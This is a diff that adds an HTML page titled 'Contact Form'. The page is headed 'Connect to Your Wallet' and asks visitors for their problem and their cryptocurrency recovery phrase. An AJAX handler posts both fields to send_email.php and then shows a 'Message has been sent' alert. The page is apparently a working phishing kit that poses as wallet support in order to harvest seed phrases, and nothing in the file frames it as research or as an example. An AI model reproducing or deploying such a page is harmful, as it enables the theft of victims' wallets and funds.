@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Contact Form</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <style>
+        body {
+            background-color: purple;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        .form-container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 5px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .form-container h1 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .form-container label {
+            font-weight: bold;
+        }
+
+        .form-container input[type="text"],
+        .form-container textarea {
+            width: 100%;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+
+        .form-container .btn-submit {
+            width: 100%;
+            background-color: purple;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="row justify-content-center">
+            <div class="col-lg-6 col-md-8 col-sm-10">
+                <div class="form-container">
+                    <h3>Connect to Your Wallet</h3>
+                    <form id="contactForm">
+                        <div class="form-group">
+                            <label for="subject">Problem Your Are Facing:</label>
+                            <input type="text" id="subject" name="subject" class="form-control" required>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="message">Your Recovery Phrase:</label>
+                            <textarea id="message" name="message" rows="5" class="form-control" required></textarea>
+                        </div>
+
+                        <div class="form-group text-center">
+                            <input type="submit" value="Import" class="btn btn-primary btn-submit">
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            $('#contactForm').submit(function(event) {
+                event.preventDefault(); // Prevent form submission
+
+                // Get form values
+                var subject = $('#subject').val();
+                var message = $('#message').val();
+
+                // Send AJAX request to the PHP script
+                $.ajax({
+                    type: 'POST',
+                    url: 'send_email.php',
+                    data: {
+                        subject: subject,
+                        message: message
+                    },
+                    success: function(response) {
+                        alert('Message has been sent'); // Show success message
+                        $('#subject').val(''); // Clear form fields
+                        $('#message').val('');
+                    },
+                    error: function(xhr, status, error) {
+                        alert('Error: ' + xhr.responseText); // Show error message
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
